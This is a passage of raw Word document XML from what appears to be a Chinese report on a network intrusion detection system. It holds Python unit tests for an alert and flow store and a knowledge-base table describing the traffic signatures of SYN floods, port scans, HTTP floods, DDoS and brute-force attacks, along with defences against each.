        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_alert("p", "k", "DDoS", 0.8, "high", {"a": 1}, [{"b": 2}])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC18F66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    row = store.alerts(limit=1)[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CCF208">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert isinstance(row["features"], dict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6216BE94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert isinstance(row["evidence"], list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F14AE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37AC38C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1592213C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_flow_list_keeps_only_display_fields(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0907A87B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：流水表接口若不裁剪特征，200 行响应会到 MB 级，看板每 2 s 拉一次会拖死浏览器。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FFF1F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store = Store(str(tmp_path / "t3.db"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37779E0F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    feats = {name: i * 1.0 for i, name in enumerate(FEATURE_ORDER)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000FB016">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    store.add_flow("probe-a", 1.0, 2.0, "6|1.1.1.1|5000|2.2.2.2|80", "BENIGN", 0.98, feats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2DED87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AE874A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    row = store.flows(limit=1)[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432AB564">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "features" not in row</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C67327">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert row["summary"]["Flow Duration"] == feats["Flow Duration"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="663C11A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(row["summary"]) &lt;= set(FLOW_DISPLAY_FIELDS)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAAC4ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(row["summary"]) &lt; len(FEATURE_ORDER) / 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6664F023">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27018797">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-9　M9 知识库全部 12 条内容（与 chunks.json 逐字段一致）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1587"/>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="4309"/>
      </w:tblGrid>
      <w:tr w14:paraId="7063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247" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="46B587C5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2AFE7315">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>标题</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="003B5B11">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>检索标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4C2E5927">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>正文</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="147F4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1923148A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>tcp-handshake</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3AC6E467">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>TCP 三次握手与状态机</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="071A1EEB">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>tcp、握手、syn、syn-ack、半连接</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="46674621">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>TCP 建立连接需要三次握手：客户端发 SYN（携带初始序列号 ISN 与接收窗口），服务端回 SYN+ACK，客户端再回 ACK。服务端在收到 SYN 后把连接放入半连接队列（SYN 队列），收到最终 ACK 后才移入全连接队列（accept 队列）。两个队列都有长度上限，队列满时后续 SYN 会被丢弃或忽略，这是 SYN 洪泛攻击的着力点。SYN 洪泛的特征是大量源地址伪造的 SYN，服务端为每个 SYN 分配资源并回 SYN+ACK，但永远等不到 ACK。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="6A21B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00312391">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>syn-flood</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="288B0EE2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>SYN Flood（SYN 洪泛）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2D40EB9C">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>syn、flood、拒绝服务、ddos、dos</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D9D02B7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>SYN 洪泛属于拒绝服务攻击。攻击者用伪造源地址大量发送 SYN，服务端半连接队列被占满，真实用户无法完成握手。典型流量特征：SYN 标志计数极高、几乎不存在 ACK、每条流只包含 1 到 2 个包、流时长短、上下行包数比接近 0（没有反向流量）。防御手段包括 SYN Cookie（不预先分配资源，把状态编码进序列号）、增大 SYN 队列、缩短 SYN 重传超时、在边界设备做源地址校验（uRPF）与速率限制。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3E6DB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247" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1340D4BF">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>port-scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1675BDB9">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>端口扫描（PortScan）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="76E5D748">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>扫描、portscan、nmap、rst、探测</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="143F761A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>端口扫描用于探测目标主机开放了哪些端口，是入侵的前置侦察。TCP connect 扫描对每个端口完成三次握手后立即断开；SYN 半开扫描只发 SYN，收到 SYN+ACK 说明端口开放、收到 RST 说明关闭，然后立刻发 RST 中止，避免被目标记录完整连接。流量特征：同一源 IP 在短时间内访问大量不同目的端口或大量不同目的主机、每条流包数极少、大量 RST 标志、目的端口分散且往往落在 1-1024 的低号端口。防御上可用防火墙默认拒绝、端口敲门、入侵检测系统按源 IP 统计单位时间内的连接尝试数。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0A622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4DAE6379">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>dos-hulk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="64B5F820">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>DoS Hulk 与 HTTP 洪泛</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1A16B3C5">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>dos、hulk、http、洪泛、应用层</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0737FA99">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>DoS Hulk 是一种 HTTP 洪泛工具，通过大量看似合法的 HTTP 请求（常带有随机化的 URL 与 User-Agent）压垮 Web 服务。与 SYN 洪泛不同，它完成完整握手，因此流量特征表现为：单条流包含较多请求、PSH 与 ACK 标志计数高、Fwd 包长集中在较小的请求大小、上下行字节比偏低（请求多而响应小或被丢弃）、Flow Packets/s 与 Flow Bytes/s 显著高于正常业务。防御重点在应用层：限流、连接数上限、识别异常的请求速率与 User-Agent 分布、用反向代理做缓存与挑战（如 JS 挑战）。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3BBC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5FF27E18">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>ddos</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5BD95BBA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>DDoS（分布式拒绝服务）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0737C735">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>ddos、分布式、僵尸网络、拒绝服务</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="42E0B26D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>DDoS 通过大量分布在不同网络的主机（僵尸网络）同时发起攻击，使目标带宽或处理能力耗尽。与单点 DoS 相比，流量特征的区别在于源 IP 数量极多、地理与 AS 分布分散、单源速率不高但总量巨大。检测上单条流往往看不出异常，必须做聚合：按目的 IP 统计单位时间的连接数与字节数。防御手段包括流量清洗中心、Anycast 分散、边界限速与黑洞路由。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="70E7A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2A1CD36B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>brute-force</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1587" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67E4648E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>暴力破解（Patator / Hydra 类）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1474" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7F096E3D">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>patator、暴力破解、ssh、ftp、认证</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4309" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D6A0AEC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Patator 是模块化的暴力破解工具，常用于 SSH、FTP、HTTP 表单等的口令猜测。FTP 与 SSH 的暴力破解在流量上相似：同一源 IP 对同一目的端口反复建立短连接，每条流包含若干次认证交互后由服务端断开，流数量多、单流时长中等、RST 与 FIN 计数偏高、上传与下载字节都不大。防御手段包括限制单源认证失败次数、账号锁定与验证码、禁用口令登录改用密钥、把 SSH 端口暴露范围收紧到跳板机。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4D6E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247" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="54B2B7EC">
            <w:pPr>
